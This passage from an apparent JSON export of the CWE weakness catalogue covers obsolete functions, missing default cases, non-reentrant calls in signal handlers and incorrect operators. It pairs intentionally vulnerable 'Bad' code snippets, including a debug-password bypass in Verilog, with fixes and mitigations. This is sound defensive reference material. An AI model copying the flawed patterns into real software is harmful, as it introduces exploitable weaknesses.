          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tBinary / Bytecode Quality Analysis\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBytecode Weakness Analysis - including disassembler + source code weakness analysis",
          "Effectiveness": "High"
        },
        {
          "Method": "Manual Static Analysis - Binary or Bytecode",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBinary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Dynamic Analysis with Manual Results Interpretation",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tDebugger",
          "Effectiveness": "High"
        },
        {
          "Method": "Manual Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tManual Source Code Review (not inspections)\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFocused Manual Spotcheck - Focused manual analysis of source",
          "Effectiveness": "High"
        },
        {
          "Method": "Automated Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tSource Code Quality Analyzer\n\t\tSource code Weakness Analyzer\n\t\tContext-configured Source Code Weakness Analyzer",
          "Effectiveness": "High"
        },
        {
          "Method": "Automated Static Analysis",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tOrigin Analysis",
          "Effectiveness": "High"
        },
        {
          "Method": "Architecture or Design Review",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tFormal Methods / Correct-By-Construction\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Refer to the documentation for the obsolete function in order to determine why it is deprecated or obsolete and to learn about alternative ways to achieve the same functionality."
        },
        {
          "Phase": [
            "Requirements"
          ],
          "Description": "Consider seriously the security implications of using an obsolete function. Consider using alternate functions."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following code uses the deprecated function getpw() to verify that a plaintext password matches a user's encrypted password. If the password is valid, the function sets result to 1; otherwise it is set to 0."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\t...\n\tgetpw(uid, pwdline);\n\tfor (i=0; i<3; i++){\n\t\tcryptpw=strtok(pwdline, \":\");\n\t\tpwdline=0;\n\t}\n\tresult = strcmp(crypt(plainpw,cryptpw), cryptpw) == 0;\n\t...\n```"
            },
            {
              "BodyText": "Although the code often behaves correctly, using the getpw() function can be problematic from a security standpoint, because it can overflow the buffer passed to its second parameter. Because of this vulnerability, getpw() has been supplanted by getpwuid(), which performs the same lookup as getpw() but returns a pointer to a statically-allocated structure to mitigate the risk. Not all functions are deprecated or replaced because they pose a security risk. However, the presence of an obsolete function often indicates that the surrounding code has been neglected and may be in a state of disrepair. Software security has not been a priority, or even a consideration, for very long. If the program uses deprecated or obsolete functions, it raises the probability that there are security problems lurking nearby."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In the following code, the programmer assumes that the system always has a property named \"cmd\" defined. If an attacker can control the program's environment so that \"cmd\" is not defined, the program throws a null pointer exception when it attempts to call the \"Trim()\" method."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tString cmd = null;\n\t...\n\tcmd = Environment.GetEnvironmentVariable(\"cmd\");\n\tcmd = cmd.Trim();\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "The following code constructs a string object from an array of bytes and a value that specifies the top 8 bits of each 16-bit Unicode character."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\t...\n\tString name = new String(nameBytes, highByte);\n\t...\n```"
            },
            {
              "BodyText": "In this example, the constructor may not correctly convert bytes to characters depending upon which charset is used to encode the string represented by nameBytes. Due to the evolution of the charsets used to encode strings, this constructor was deprecated and replaced by a constructor that accepts as one of its parameters the name of the charset used to encode the bytes for conversion."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "7 Pernicious Kingdoms",
          "EntryName": "Obsolete"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP3",
          "EntryName": "Use of an improper API"
        },
        {
          "TaxonomyName": "SEI CERT Perl Coding Standard",
          "EntryID": "DCL30-PL",
          "EntryName": "Do not import deprecated modules",
          "MappingFit": "CWE More Specific"
        },
        {
          "TaxonomyName": "SEI CERT Perl Coding Standard",
          "EntryID": "EXP30-PL",
          "EntryName": "Do not use deprecated or obsolete functions or modules",
          "MappingFit": "CWE More Specific"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-6",
          "Authors": [
            "Katrina Tsipenyuk",
            "Brian Chess",
            "Gary McGraw"
          ],
          "Title": "Seven Pernicious Kingdoms: A Taxonomy of Software Security Errors",
          "Publication": "NIST Workshop on Software Security Assurance Tools Techniques and Metrics",
          "PublicationYear": "2005",
          "PublicationMonth": "11",
          "PublicationDay": "07",
          "Publisher": "NIST",
          "URL": "https://samate.nist.gov/SSATTM_Content/papers/Seven%20Pernicious%20Kingdoms%20-%20Taxonomy%20of%20Sw%20Security%20Errors%20-%20Tsipenyuk%20-%20Chess%20-%20McGraw.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "478",
      "Name": "Missing Default Case in Multiple Condition Expression",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The code does not have a default case in an expression with multiple conditions, such as a switch statement.",
      "ExtendedDescription": "If a multiple-condition expression (such as a switch in C) omits the default case but does not consider or handle all possible values that could occur, then this might lead to complex logical errors and resultant weaknesses. Because of this, further decisions are made based on poor information, and cascading failure results. This cascading failure may result in any number of security issues, and constitutes a significant failure in the system.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1023",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C#",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "Python",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "JavaScript",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Varies by Context",
            "Alter Execution Logic"
          ],
          "Note": "Depending on the logical circumstances involved, any consequences may result: e.g., issues of confidentiality, authentication, authorization, availability, integrity, accountability, or non-repudiation."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Ensure that there are no cases unaccounted for when adjusting program flow or values based on the value of a given variable. In the case of switch style statements, the very simple act of creating a default case can, if done correctly, mitigate this situation. Often however, the default case is used simply to represent an assumed option, as opposed to working as a check for invalid input. This is poor practice and in some cases is as bad as omitting a default case entirely."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following does not properly check the return code in the case where the security_check function returns a -1 value when an error occurs. If an attacker can supply data that will invoke an error, the attacker can bypass the security check:"
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\t#define FAILED 0\n\t#define PASSED 1\n\tint result;\n\t...\n\tresult = security_check(data);\n\tswitch (result) {\n\t\t\tcase FAILED:\n\t\t\t\tprintf(\"Security check failed!\\n\");\n\t\t\t\texit(-1);\n```\n//Break never reached because of exit()* \n\t\t\t\tbreak;\n\t\t\tcase PASSED:\n\t\t\t```\n\t\t\t\tprintf(\"Security check passed.\\n\");\n\t\t\t\tbreak;\n\t}\n```\n// program execution continues...* \n\t..."
            },
            {
              "BodyText": "Instead a default label should be used for unaccounted conditions:"
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "```\n\t#define FAILED 0\n\t#define PASSED 1\n\tint result;\n\t...\n\tresult = security_check(data);\n\tswitch (result) {\n\t\t\tcase FAILED:\n\t\t\t\tprintf(\"Security check failed!\\n\");\n\t\t\t\texit(-1);\n```\n//Break never reached because of exit()* \n\t\t\t\tbreak;\n\t\t\tcase PASSED:\n\t\t\t```\n\t\t\t\tprintf(\"Security check passed.\\n\");\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tprintf(\"Unknown error (%d), exiting...\\n\",result);\n\t\t\t\texit(-1);\n\t}\n```"
            },
            {
              "BodyText": "This label is used because the assumption cannot be made that all possible cases are accounted for. A good practice is to reserve the default case for error handling."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In the following Java example the method getInterestRate retrieves the interest rate for the number of points for a mortgage. The number of points is provided within the input parameter and a switch statement will set the interest rate value to be returned based on the number of points."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic static final String INTEREST_RATE_AT_ZERO_POINTS = \"5.00\";\n\tpublic static final String INTEREST_RATE_AT_ONE_POINTS = \"4.75\";\n\tpublic static final String INTEREST_RATE_AT_TWO_POINTS = \"4.50\";\n\t...\n\tpublic BigDecimal getInterestRate(int points) {\n\t\t\tBigDecimal result = new BigDecimal(INTEREST_RATE_AT_ZERO_POINTS);\n\t\t\tswitch (points) {\n\t\t\t\t\tcase 0:\n\t\t\t\t\t\tresult = new BigDecimal(INTEREST_RATE_AT_ZERO_POINTS);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 1:\n\t\t\t\t\t\tresult = new BigDecimal(INTEREST_RATE_AT_ONE_POINTS);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 2:\n\t\t\t\t\t\tresult = new BigDecimal(INTEREST_RATE_AT_TWO_POINTS);\n\t\t\t\t\t\tbreak;\n\t\t\t}\n\t\t\treturn result;\n\t}\n```"
            },
            {
              "BodyText": "However, this code assumes that the value of the points input parameter will always be 0, 1 or 2 and does not check for other incorrect values passed to the method. This can be easily accomplished by providing a default label in the switch statement that outputs an error message indicating an invalid value for the points input parameter and returning a null value."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic static final String INTEREST_RATE_AT_ZERO_POINTS = \"5.00\";\n\tpublic static final String INTEREST_RATE_AT_ONE_POINTS = \"4.75\";\n\tpublic static final String INTEREST_RATE_AT_TWO_POINTS = \"4.50\";\n\t...\n\tpublic BigDecimal getInterestRate(int points) {\n\t\t\tBigDecimal result = new BigDecimal(INTEREST_RATE_AT_ZERO_POINTS);\n\t\t\tswitch (points) {\n\t\t\t\t\tcase 0:\n\t\t\t\t\t\tresult = new BigDecimal(INTEREST_RATE_AT_ZERO_POINTS);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 1:\n\t\t\t\t\t\tresult = new BigDecimal(INTEREST_RATE_AT_ONE_POINTS);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 2:\n\t\t\t\t\t\tresult = new BigDecimal(INTEREST_RATE_AT_TWO_POINTS);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tdefault:\n\t\t\t\t\t\tSystem.err.println(\"Invalid value for points, must be 0, 1 or 2\");\n\t\t\t\t\t\tSystem.err.println(\"Returning null value for interest rate\");\n\t\t\t\t\t\tresult = null;\n\t\t\t}\n\t\t\treturn result;\n\t}\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In the following Python example the match-case statements (available in Python version 3.10 and later) perform actions based on the result of the process_data() function. The expected return is either 0 or 1. However, if an unexpected result (e.g., -1 or 2) is obtained then no actions will be taken potentially leading to an unexpected program state."
            },
            {
              "Nature": "Bad",
              "Language": "Python",
              "ExampleCode": "```\n\tresult = process_data(data) \n\tmatch result: \n\t\tcase 0: \n\t\t\tprint(\"Properly handle zero case.\")\n\t\tcase 1: \n\t\t\tprint(\"Properly handle one case.\")\n\t# program execution continues...\n```"
            },
            {
              "BodyText": "The recommended approach is to add a default case that captures any unexpected result conditions, regardless of how improbable these unexpected conditions might be, and properly handles them."
            },
            {
              "Nature": "Good",
              "Language": "Python",
              "ExampleCode": "```\n\tresult = process_data(data) \n\tmatch result: \n\t\tcase 0: \n\t\t\tprint(\"Properly handle zero case.\")\n\t\tcase 1: \n\t\t\tprint(\"Properly handle one case.\")\n\t\tcase _: \n\t\t\tprint(\"Properly handle unexpected condition.\")\n\t# program execution continues...\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In the following JavaScript example the switch-case statements (available in JavaScript version 1.2 and later) are used to process a given step based on the result of a calcuation involving two inputs. The expected return is either 1, 2, or 3. However, if an unexpected result (e.g., 4) is obtained then no action will be taken potentially leading to an unexpected program state."
            },
            {
              "Nature": "Bad",
              "Language": "JavaScript",
              "ExampleCode": "```\n\tlet step = input1 + input2; \n\tswitch(step) { \n\t\tcase 1: \n\t\t\talert(\"Process step 1.\"); \n\t\t\tbreak;\n\t\tcase 2: \n\t\t\talert(\"Process step 2.\"); \n\t\t\tbreak;\n\t\tcase 3: \n\t\t\talert(\"Process step 3.\"); \n\t\t\tbreak;\n\t} \n\t// program execution continues...\n```"
            },
            {
              "BodyText": "The recommended approach is to add a default case that captures any unexpected result conditions and properly handles them."
            },
            {
              "Nature": "Good",
              "Language": "JavaScript",
              "ExampleCode": "```\n\tlet step = input1 + input2; \n\tswitch(step) { \n\t\tcase 1: \n\t\t\talert(\"Process step 1.\"); \n\t\t\tbreak;\n\t\tcase 2: \n\t\t\talert(\"Process step 2.\"); \n\t\t\tbreak;\n\t\tcase 3: \n\t\t\talert(\"Process step 3.\"); \n\t\t\tbreak;\n\t\tdefault: \n\t\t\talert(\"Unexpected step encountered.\");\n\t} \n\t// program execution continues...\n```"
            }
          ]
        },
        {
          "ID": "DX-152",
          "Entries": [
            {
              "IntroText": "The Finite State Machine (FSM) shown in the \"bad\" code snippet below assigns the output (\"out\") based on the value of state, which is determined based on the user provided input (\"user_input\")."
            },
            {
              "Nature": "Bad",
              "Language": "Verilog",
              "ExampleCode": "```\n\tmodule fsm_1(out, user_input, clk, rst_n); \n\tinput [2:0] user_input; \n\tinput clk, rst_n; \n\toutput reg [2:0] out; \n\treg [1:0] state; \n\talways @ (posedge clk or negedge rst_n ) \n\t\tbegin \n\t\t\t if (!rst_n)\n\t\t\t\t state = 3'h0; \n\t\t\t else\n\t\t\t case (user_input) \n\t\t\t\t 3'h0:\n\t\t\t\t 3'h1:\n\t\t\t\t 3'h2:\n\t\t\t\t 3'h3: state = 2'h3;\n\t\t\t\t 3'h4: state = 2'h2;\n\t\t\t\t 3'h5: state = 2'h1;\n\t\t\t endcase \n\t\t end\n\t\t out <= {1'h1, state};\n\t endmodule \n```"
            },
            {
              "BodyText": "The case statement does not include a default to handle the scenario when the user provides inputs of 3'h6 and 3'h7. Those inputs push the system to an undefined state and might cause a crash (denial of service) or any other unanticipated outcome.\n\n\nAdding a default statement to handle undefined inputs mitigates this issue. This is shown in the \"Good\" code snippet below. The default statement is in bold."
            },
            {
              "Nature": "Good",
              "Language": "Verilog",
              "ExampleCode": "```\n\tcase (user_input) \n\t\t3'h0: \n\t\t3'h1: \n\t\t3'h2: \n\t\t3'h3: state = 2'h3; \n\t\t3'h4: state = 2'h2; \n\t\t3'h5: state = 2'h1; \n```\ndefault: state = 2'h0;**  endcase"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Failure to account for default case in switch"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP4",
          "EntryName": "Unchecked Status Condition"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-18",
          "Authors": [
            "Secure Software, Inc."
          ],
          "Title": "The CLASP Application Security Process",
          "PublicationYear": "2005",
          "URL": "https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 7, \"Switch Statements\", Page 337",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "479",
      "Name": "Signal Handler Use of a Non-reentrant Function",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product defines a signal handler that calls a non-reentrant function.",
      "ExtendedDescription": "\n\nNon-reentrant functions are functions that cannot safely be called, interrupted, and then recalled before the first call has finished without resulting in memory corruption. This can lead to an unexpected system state and unpredictable results with a variety of potential consequences depending on context, including denial of service and code execution.\n\n\nMany functions are not reentrant, but some of them can result in the corruption of memory if they are used in a signal handler. The function call syslog() is an example of this. In order to perform its functionality, it allocates a small amount of memory as \"scratch space.\" If syslog() is suspended by a signal call and the signal handler calls syslog(), the memory used by both of these functions enters an undefined, and possibly, exploitable state. Implementations of malloc() and free() manage metadata in global structures in order to track which memory is allocated versus which memory is available, but they are non-reentrant. Simultaneous calls to these functions can cause corruption of the metadata.\n",
      "LikelihoodOfExploit": "Low",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "828",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "663",
          "ViewID": "1000"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "123",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands"
          ],
          "Note": "It may be possible to execute arbitrary code through the use of a write-what-where condition."
        },
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Memory",
            "Modify Application Data"
          ],
          "Note": "Signal race conditions often result in data corruption."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Requirements"
          ],
          "Description": "Require languages or libraries that provide reentrant functionality, or otherwise make it easier to avoid this weakness."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Design signal handlers to only set flags rather than perform complex functionality."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Ensure that non-reentrant functions are not found in signal handlers."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Use sanity checks to reduce the timing window for exploitation of race conditions. This is only a partial solution, since many attacks might fail, but other attacks still might work within the narrower window, even accidentally.",
          "Effectiveness": "Defense in Depth"
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-171",
          "Entries": [
            {
              "IntroText": "In this example, a signal handler uses syslog() to log a message:"
            },
            {
              "Nature": "Bad",
              "ExampleCode": "```\n\tchar *message;\n\tvoid sh(int dummy) {\n\t\tsyslog(LOG_NOTICE,\"%s\\n\",message);\n\t\tsleep(10);\n\t\texit(0);\n\t}\n\tint main(int argc,char* argv[]) {\n\t\t...\n\t\tsignal(SIGHUP,sh);\n\t\tsignal(SIGTERM,sh);\n\t\tsleep(10);\n\t\texit(0);\n\t}\n\t\tIf the execution of the first call to the signal handler is suspended after invoking syslog(), and the signal handler is called a second time, the memory allocated by syslog() enters an undefined, and possibly, exploitable state.\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2005-0893",
          "Description": "signal handler calls function that ultimately uses malloc()",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-0893"
        },
        {
          "Reference": "CVE-2004-2259",
          "Description": "SIGCHLD signal to FTP server can cause crash under heavy load while executing non-reentrant functions like malloc/free.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-2259"
        }
      ],
      "AffectedResources": [
        "System Process"
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Unsafe function call from a signal handler"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "SIG30-C",
          "EntryName": "Call only asynchronous-safe functions within signal handlers",
          "MappingFit": "Exact"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "SIG34-C",
          "EntryName": "Do not call signal() from within interruptible signal handlers"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "EXP01-J",
          "EntryName": "Never dereference null pointers"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP3",
          "EntryName": "Use of an improper API"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-18",
          "Authors": [
            "Secure Software, Inc."
          ],
          "Title": "The CLASP Application Security Process",
          "PublicationYear": "2005",
          "URL": "https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 13, \"Signal Vulnerabilities\", Page 791",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "480",
      "Name": "Use of Incorrect Operator",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product accidentally uses the wrong operator, which changes the logic in security-relevant ways.",
      "ExtendedDescription": "These types of errors are generally the result of a typo by the programmer.",
      "LikelihoodOfExploit": "Low",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "670",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Sometimes"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Sometimes"
        },
        {
          "Type": "Language",
          "Name": "Perl",
          "Prevalence": "Sometimes"
        },
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Alter Execution Logic"
          ],
          "Note": "This weakness can cause unintended logic to be executed and other unexpected application behavior."
        }
      ],
      "DetectionMethods": [
        {
          "Method": "Automated Static Analysis",
          "Description": "This weakness can be found easily using static analysis. However in some cases an operator might appear to be incorrect, but is actually correct and reflects unusual logic within the program."
        },
        {
          "Method": "Manual Static Analysis",
          "Description": "This weakness can be found easily using static analysis. However in some cases an operator might appear to be incorrect, but is actually correct and reflects unusual logic within the program."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-140",
          "Entries": [
            {
              "IntroText": "The following C/C++ and C# examples attempt to validate an int input parameter against the integer value 100."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint isValid(int value) {\n\t\tif (value=100) {\n\t\t\tprintf(\"Value is valid\\n\");\n\t\t\treturn(1);\n\t\t}\n\t\tprintf(\"Value is not valid\\n\");\n\t\treturn(0);\n\t}\n```"
            },
            {
              "Nature": "Bad",
              "Language": "C#",
              "ExampleCode": "```\n\tbool isValid(int value) {\n\t\tif (value=100) {\n\t\t\tConsole.WriteLine(\"Value is valid.\");\n\t\t\treturn true;\n\t\t}\n\t\tConsole.WriteLine(\"Value is not valid.\");\n\t\treturn false;\n\t}\n```"
            },
            {
              "BodyText": "However, the expression to be evaluated in the if statement uses the assignment operator \"=\" rather than the comparison operator \"==\". The result of using the assignment operator instead of the comparison operator causes the int variable to be reassigned locally and the expression in the if statement will always evaluate to the value on the right hand side of the expression. This will result in the input value not being properly validated, which can cause unexpected results."
            }
          ]
        },
        {
          "ID": "DX-103",
          "Entries": [
            {
              "IntroText": "The following C/C++ example shows a simple implementation of a stack that includes methods for adding and removing integer values from the stack. The example uses pointers to add and remove integer values to the stack array variable."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\t#define SIZE 50\n\tint *tos, *p1, stack[SIZE];\n\tvoid push(int i) {\n\t\t\tp1++;\n\t\t\tif(p1==(tos+SIZE)) {\n```\n// Print stack overflow error message and exit* \n\t\t\t\t\t}\n\t\t\t*p1 == i;}\n\t\n\tint pop(void) {\n\t```\n\t\t\tif(p1==tos) {\n```\n// Print stack underflow error message and exit* \n\t\t\t\t\t}\n\t\t\tp1--;\n\t\t\treturn *(p1+1);}\n\t\n\tint main(int argc, char *argv[]) {\n\t```\n```\n// initialize tos and p1 to point to the top of stack* \n\t\t\ttos = stack;\n\t\t\tp1 = stack;\n\t\t\t\n\t\t\t *// code to add and remove items from stack* \n\t\t\t...\n\t\t\treturn 0;}"
            },
            {
              "BodyText": "The push method includes an expression to assign the integer value to the location in the stack pointed to by the pointer variable."
            },
            {
              "BodyText": "However, this expression uses the comparison operator \"==\" rather than the assignment operator \"=\". The result of using the comparison operator instead of the assignment operator causes erroneous values to be entered into the stack and can cause unexpected results."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "The example code below is taken from the CVA6 processor core of the HACK@DAC'21 buggy OpenPiton SoC. Debug access allows users to access internal hardware registers that are otherwise not exposed for user access or restricted access through access control protocols. Hence, requests to enter debug mode are checked and authorized only if the processor has sufficient privileges. In addition, debug accesses are also locked behind password checkers. Thus, the processor enters debug mode only when the privilege level requirement is met, and the correct debug password is provided."
            },
            {
              "BodyText": "The following code [REF-1377] illustrates an instance of a vulnerable implementation of debug mode. The core correctly checks if the debug requests have sufficient privileges and enables the debug_mode_d and debug_mode_q signals. It also correctly checks for debug password and enables umode_i signal."
            },
            {
              "Nature": "Bad",
              "Language": "Verilog",
              "ExampleCode": "module csr_regfile #(\n ...\n\n```\n\t // check that we actually want to enter debug depending on the privilege level we are currently in\n\t unique case (priv_lvl_o)\n\t\t riscv::PRIV_LVL_M: begin\n\t\t\t debug_mode_d = dcsr_q.ebreakm;\n ...\n\t\t riscv::PRIV_LVL_U: begin\n\t\t\t debug_mode_d = dcsr_q.ebreaku;\n ...\n```\nassign priv_lvl_o = (debug_mode_q || umode_i) ? riscv::PRIV_LVL_M : priv_lvl_q;** \n\t ...\n\n```\n\t debug_mode_q <= debug_mode_d;\n ...\n```"
            },
            {
              "BodyText": "However, it grants debug access and changes the privilege level, priv_lvl_o, even when one of the two checks is satisfied and the other is not. Because of this, debug access can be granted by simply requesting with sufficient privileges (i.e., debug_mode_q is enabled) and failing the password check (i.e., umode_i is disabled). This allows an attacker to bypass the debug password checking and gain debug access to the core, compromising the security of the processor."
            },
            {
              "BodyText": "A fix to this issue is to only change the privilege level of the processor when both checks are satisfied, i.e., the request has enough privileges (i.e., debug_mode_q is enabled) and the password checking is successful (i.e., umode_i is enabled) [REF-1378]."
            },
            {
              "Nature": "Good",
              "Language": "Verilog",
